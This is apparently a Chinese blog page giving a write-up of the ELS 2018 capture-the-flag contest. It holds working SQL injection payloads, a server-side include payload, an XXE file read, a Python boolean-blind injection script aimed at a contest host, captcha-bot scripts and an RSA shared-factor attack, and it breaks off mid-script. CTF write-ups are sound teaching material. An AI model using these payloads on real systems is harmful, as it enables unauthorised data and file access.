@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>ELS_2018_WriteUp | Altm4nz</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="webwp" />
+  
+  
+  
+  
+  <meta name="description" content="WEBSimpleBBS登录界面界面随手尝试输入单引号，引发了报错。  随即尝试报错注入">
+<meta name="keywords" content="web,wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ELS_2018_WriteUp">
+<meta property="og:url" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;11&#x2F;16&#x2F;ELS-2018-WriteUp&#x2F;index.html">
+<meta property="og:site_name" content="Altm4nz">
+<meta property="og:description" content="WEBSimpleBBS登录界面界面随手尝试输入单引号，引发了报错。  随即尝试报错注入">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;11&#x2F;16&#x2F;ELS-2018-WriteUp&#x2F;1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;11&#x2F;16&#x2F;ELS-2018-WriteUp&#x2F;2.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;11&#x2F;16&#x2F;ELS-2018-WriteUp&#x2F;3.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;11&#x2F;16&#x2F;ELS-2018-WriteUp&#x2F;5.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;11&#x2F;16&#x2F;ELS-2018-WriteUp&#x2F;6.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;11&#x2F;16&#x2F;ELS-2018-WriteUp&#x2F;4.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;11&#x2F;16&#x2F;ELS-2018-WriteUp&#x2F;7.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;11&#x2F;16&#x2F;ELS-2018-WriteUp&#x2F;8.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;11&#x2F;16&#x2F;ELS-2018-WriteUp&#x2F;9.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;11&#x2F;16&#x2F;ELS-2018-WriteUp&#x2F;10.jpg">
+<meta property="og:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;11&#x2F;16&#x2F;ELS-2018-WriteUp&#x2F;11.png">
+<meta property="og:updated_time" content="2018-11-16T17:25:23.365Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;11&#x2F;16&#x2F;ELS-2018-WriteUp&#x2F;1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Altm4nz" type="application/atom+xml">
+  
+  <link rel="icon" href="/css/images/pokemon.ico">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+    
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+  <link rel="stylesheet" href="/css/fashion.css" >
+  <link rel="stylesheet" href="/css/glyphs.css" >
+
+</head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+
+
+<header id="allheader" class="site-header" role="banner" 
+   >
+  <div class="clearfix container">
+      <div class="site-branding">
+
+          <h1 class="site-title">
+            
+              <a href="/" title="Altm4nz" rel="home"> Altm4nz </a>
+            
+          </h1>
+          
+          
+            
+          <nav id="main-navigation" class="main-navigation" role="navigation">
+            <a class="nav-open">Menu</a>
+            <a class="nav-close">Close</a>
+
+            <div class="clearfix sf-menu">
+              <ul id="main-nav" class="menu sf-js-enabled sf-arrows"  style="touch-action: pan-y;">
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/">Home</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/archives">Archives</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/tags">Tags</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/friend">friend</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/about">About</a> </li>
+                    
+              </ul>
+            </div>
+          </nav>
+
+      </div>
+  </div>
+</header>
+
+
+  <div id="container">
+    <div id="wrap">
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-ELS-2018-WriteUp" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      ELS_2018_WriteUp
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2018/11/16/ELS-2018-WriteUp/" class="article-date">
+	  <time datetime="2018-11-16T14:47:56.000Z" itemprop="datePublished">November 16, 2018</time>
+	</a>
+
+       
+      
+	<span id="busuanzi_container_page_pv">
+	  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+	</span>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="SimpleBBS"><a href="#SimpleBBS" class="headerlink" title="SimpleBBS"></a>SimpleBBS</h2><p>登录界面界面随手尝试输入单引号，引发了报错。</p>
+<p><img src="/2018/11/16/ELS-2018-WriteUp/1.png" alt=""></p>
+<p>随即尝试报错注入</p>
+<a id="more"></a>
+
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>' and (extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>)))#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/11/16/ELS-2018-WriteUp/2.png" alt=""></p>
+<p>成功爆出数据库，下面就是常规注入了</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>' and (extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select flag from flag limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>)))#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/11/16/ELS-2018-WriteUp/3.png" alt=""></p>
+<p>用substr函数截取，拿到完整flag。</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>' and (extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select substr(flag,<span class="number">20</span>,<span class="number">40</span>) from flag limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>)))#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/11/16/ELS-2018-WriteUp/5.png" alt=""></p>
+<h2 id="SimpleServerInjection"><a href="#SimpleServerInjection" class="headerlink" title="SimpleServerInjection"></a>SimpleServerInjection</h2><p>hint：SimpleServerInjection, SSI, flag in current directory</p>
+<p>SSI:服务器端包含攻击</p>
+<p><a href="https://www.secpulse.com/archives/66934.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/66934.html</a></p>
+<p>根据文章的payload ：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--#include virtual="flag" --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/11/16/ELS-2018-WriteUp/6.png" alt=""></p>
+<h2 id="SimpleExtensionExplorerInjection"><a href="#SimpleExtensionExplorerInjection" class="headerlink" title="SimpleExtensionExplorerInjection"></a>SimpleExtensionExplorerInjection</h2><p>提示XXE, /flag。</p>
+<p>直接尝试XXE进行读文件</p>
+<p><img src="/2018/11/16/ELS-2018-WriteUp/4.png" alt=""></p>
+<p>需要改 content-type:application/xml</p>
+<h2 id="SimplePrintEventLogger"><a href="#SimplePrintEventLogger" class="headerlink" title="SimplePrintEventLogger"></a>SimplePrintEventLogger</h2><p>hint:same server as SimpleExtensionExploreInjection , RCE, flag in /</p>
+<p>和上一题同样的环境，flag在根目录下。</p>
+<p>还是用上题的payload</p>
+<p><img src="/2018/11/16/ELS-2018-WriteUp/7.png" alt=""></p>
+<p>直接读到根目录，有个flagvvvvvaaaagegsgag2333文件</p>
+<p>然后读flagvvvvvaaaagegsgag2333</p>
+<p><img src="/2018/11/16/ELS-2018-WriteUp/8.png" alt=""></p>
+<p>(和RCE有什么关系？非预期了吗)</p>
+<h2 id="SimpleBlog"><a href="#SimpleBlog" class="headerlink" title="SimpleBlog"></a>SimpleBlog</h2><p>随便登录进去之后看到提示二次注入和文件包含。</p>
+<p>经过一波尝试发现</p>
+<p>注册一个   a’  账户 ，无论怎么点题目都是0分。</p>
+<p>但是注册一个 a’ #  ，点题会有分数出现。可以构造bool盲注 。</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>' and if(<span class="number">1</span>,exp(<span class="number">999999999999</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>
+
+<p>执行exp()函数会造成报错，会造成分数都为0。</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>' and if(<span class="number">0</span>,exp(<span class="number">999999999999</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>
+
+<p>如果语句正常执行不报错，分数会正常显示。</p>
+<p>这样就构成了bool盲注。</p>
+<p>编写脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span><span class="params">(name)</span>:</span></span><br><span class="line">    url=<span class="string">"http://210.32.4.20/register.php"</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'username'</span>: name ,</span><br><span class="line">         <span class="string">'password'</span>: <span class="string">'123456'</span></span><br><span class="line">    &#125;</span><br><span class="line">    r=requests.post(url=url,data=data)</span><br><span class="line">    <span class="keyword">return</span> r.headers[<span class="string">'Set-Cookie'</span>][<span class="number">10</span>:<span class="number">-8</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(name,cookie)</span>:</span></span><br><span class="line">    cookies = &#123;</span><br><span class="line">        <span class="string">'PHPSESSID'</span>: cookie</span><br><span class="line">    &#125;</span><br><span class="line">    url=<span class="string">'http://210.32.4.20/login.php'</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'username'</span>: name,</span><br><span class="line">        <span class="string">'password'</span>: <span class="string">'123456'</span></span><br><span class="line">    &#125;</span><br><span class="line">    requests.post(url=url, data=data, cookies=cookies)</span><br><span class="line">    url = <span class="string">'http://210.32.4.20/answer.php'</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'1.a'</span>: <span class="string">'on'</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url=url, data=data, cookies=cookies)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Your grades is 0'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> (<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">'''1' and if((ascii(substr((select flag from flag limit 0,1),%d,1))=%d),exp(999999999999),1)#'''</span>%(i, j)</span><br><span class="line">        session = reg(payload)</span><br><span class="line">        <span class="keyword">if</span> (log(payload,session)):</span><br><span class="line">            flag=flag+chr(j)</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>根据提示在flag表flag段中找到。</p>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h2><p>流量包追踪tcp流</p>
+<p><img src="/2018/11/16/ELS-2018-WriteUp/9.png" alt=""></p>
+<p>保存照片得到flag。</p>
+<h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>验证码识别题</p>
+<p><img src="/2018/11/16/ELS-2018-WriteUp/10.jpg" alt=""></p>
+<p>由于数量大并且有时间显示，考虑跑脚本来进⾏自动识别。首先需要写⼀一个training.py，收集验证码供人识别，产⽣一个训练集：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"></span><br><span class="line">labels = dict()</span><br><span class="line"></span><br><span class="line">labeled = <span class="number">0</span></span><br><span class="line">fails = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> labeled &lt; <span class="number">36</span>:</span><br><span class="line">    isFailed = <span class="literal">True</span></span><br><span class="line">    io = pwn.remote(<span class="string">'210.32.4.14'</span>, <span class="number">13373</span>)</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.recvline()</span><br><span class="line">    lines = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        cur = io.recvline()</span><br><span class="line">        lines.append(cur)</span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        cur = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">18</span> * no, <span class="number">18</span> * (no + <span class="number">1</span>)):</span><br><span class="line">                cur += lines[i][j]</span><br><span class="line">            cur += <span class="string">'\n'</span></span><br><span class="line">        isLabeled = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> value <span class="keyword">in</span> labels.itervalues():</span><br><span class="line">            <span class="keyword">if</span> cur == value:</span><br><span class="line">                isLabeled = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> isLabeled:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">print</span> cur</span><br><span class="line">        ans = raw_input()</span><br><span class="line">        labels[ans[<span class="number">0</span>]] = cur</span><br><span class="line">        labeled += <span class="number">1</span></span><br><span class="line">        isFailed = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isFailed:</span><br><span class="line">        fails += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        fails = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> fails &gt; <span class="number">20</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'%d pictures have been labeled. '</span> % labeled</span><br><span class="line">    io.close()</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'trainingset.txt'</span>, <span class="string">'wt'</span>)</span><br><span class="line"><span class="keyword">for</span> key, value <span class="keyword">in</span> labels.iteritems():</span><br><span class="line">    f.write(key)</span><br><span class="line">    f.write(<span class="string">'='</span>)</span><br><span class="line">    f.write(value.encode(<span class="string">'hex'</span>))</span><br><span class="line">    f.write(<span class="string">'#\n'</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
+
+<p>然后开始自动识别</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"></span><br><span class="line">labels = dict()</span><br><span class="line">f = open(<span class="string">'trainingset.txt'</span>, <span class="string">'rt'</span>)</span><br><span class="line">flines = f.readlines()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> flines:</span><br><span class="line">    c = line[<span class="number">0</span>]</span><br><span class="line">    label = line[<span class="number">2</span>:<span class="number">-2</span>].decode(<span class="string">'hex'</span>)</span><br><span class="line">    labels[c] = label</span><br><span class="line"></span><br><span class="line">io = pwn.remote(<span class="string">'210.32.4.14'</span>, <span class="number">13373</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    lines = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        cur = io.recvline()</span><br><span class="line">        lines.append(cur)</span><br><span class="line">    ans = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        cur = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">18</span> * no, <span class="number">18</span> * (no + <span class="number">1</span>)):</span><br><span class="line">                cur += lines[i][j]</span><br><span class="line">            cur += <span class="string">'\n'</span></span><br><span class="line">        isLabeled = <span class="literal">False</span></span><br><span class="line">        curChr = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> labels.iteritems():</span><br><span class="line">            <span class="keyword">if</span> cur == value:</span><br><span class="line">                isLabeled = <span class="literal">True</span></span><br><span class="line">                curChr = key</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isLabeled:</span><br><span class="line">            <span class="keyword">print</span> cur</span><br><span class="line">            curChr = raw_input()[<span class="number">0</span>]</span><br><span class="line">            labels[curChr] = cur</span><br><span class="line">            f = open(<span class="string">'trainingset.txt'</span>, <span class="string">'at'</span>)</span><br><span class="line">            f.write(curChr)</span><br><span class="line">            f.write(<span class="string">'='</span>)</span><br><span class="line">            f.write(cur.encode(<span class="string">'hex'</span>))</span><br><span class="line">            f.write(<span class="string">'#\n'</span>)</span><br><span class="line">        ans += curChr</span><br><span class="line">    io.recvuntil(<span class="string">'your captcha: '</span>)</span><br><span class="line">    io.sendline(ans)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> io.recvall()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
+
+<p>拿到flag</p>
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="AzureRSA"><a href="#AzureRSA" class="headerlink" title="AzureRSA"></a>AzureRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">n1=<span class="number">0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723L</span></span><br><span class="line">e1=<span class="number">0xfae3aL</span></span><br><span class="line">c1=<span class="number">0x81523a330fb15125b6184e4461dadac7601340960840c5213b67a788c84aecfcdc3caf0bf3e27e4c95bb3c154db7055376981972b1565c22c100c47f3fa1dd2994e56090067b4e66f1c3905f9f780145cdf8d0fea88a45bae5113da37c8879c9cdb8ee9a55892bac3bae11fbbabcba0626163d0e2e12c04d99f4eeba5071cbeaL</span></span><br><span class="line">n2=<span class="number">0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63L</span></span><br><span class="line">e2=<span class="number">0x1f9eaeL</span></span><br><span class="line">c2=<span class="number">0x4d7ceaadf5e662ab2e0149a8d18a4777b4cd4a7712ab825cf913206c325e6abb88954ebc37b2bda19aed16c5938ac43f43966e96a86913129e38c853ecd4ebc89e806f823ffb802e3ddef0ac6c5ba078d3983393a91cd7a1b59660d47d2045c03ff529c341f3ed994235a68c57f8195f75d61fc8cac37e936d9a6b75c4bd2347L</span></span><br><span class="line"><span class="keyword">assert</span> pow(flag,e1,n1)==c1</span><br><span class="line"><span class="keyword">assert</span> pow(flag,e2,n2)==c2</span><br><span class="line"><span class="keyword">assert</span> gcd(e1,(p1<span class="number">-1</span>)*(q1<span class="number">-1</span>))==<span class="number">14</span></span><br><span class="line"><span class="keyword">assert</span> gcd(e2,(p2<span class="number">-1</span>)*(q2<span class="number">-1</span>))==<span class="number">14</span></span><br></pre></td></tr></table></figure>
+
+<p>解密脚本</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line"><span class="keyword">from</span> libnum import *</span><br><span class="line"><span class="attribute">n1</span>=0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723L</span><br><span class="line"><span class="attribute">e1</span>=0xfae3aL</span><br><span class="line"><span class="attribute">c1</span>=0x81523a330fb15125b6184e4461dadac7601340960840c5213b67a788c84aecfcdc3caf0bf3e27e4c95bb3c154db7055376981972b1565c22c100c47f3fa1dd2994e56090067b4e66f1c3905f9f780145cdf8d0fea88a45bae5113da37c8879c9cdb8ee9a55892bac3bae11fbbabcba0626163d0e2e12c04d99f4eeba5071cbeaL</span><br><span class="line"><span class="attribute">n2</span>=0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63L</span><br><span class="line"><span class="attribute">e2</span>=0x1f9eaeL</span><br><span class="line"><span class="attribute">c2</span>=0x4d7ceaadf5e662ab2e0149a8d18a4777b4cd4a7712ab825cf913206c325e6abb88954ebc37b2bda19aed16c5938ac43f43966e96a86913129e38c853ecd4ebc89e806f823ffb802e3ddef0ac6c5ba078d3983393a91cd7a1b59660d47d2045c03ff529c341f3ed994235a68c57f8195f75d61fc8cac37e936d9a6b75c4bd2347L</span><br><span class="line"><span class="attribute">p</span>=gcd(n1,n2)</span><br><span class="line"><span class="attribute">q1</span>=n1/p</span><br><span class="line"><span class="attribute">q2</span>=n2/p</span><br><span class="line">assert(p*<span class="attribute">q1</span>==n1)</span><br><span class="line">assert(p*<span class="attribute">q2</span>==n2)</span><br><span class="line">f1=(p-1)*(q1-1)</span><br><span class="line">f2=(p-1)*(q2-1)</span><br><span class="line"><span class="attribute">tmp</span>=gcd(e1,e2)</span><br><span class="line"><span class="attribute">e1</span>=e1/tmp</span><br><span class="line"><span class="attribute">e2</span>=e2/tmp</span><br><span class="line"><span 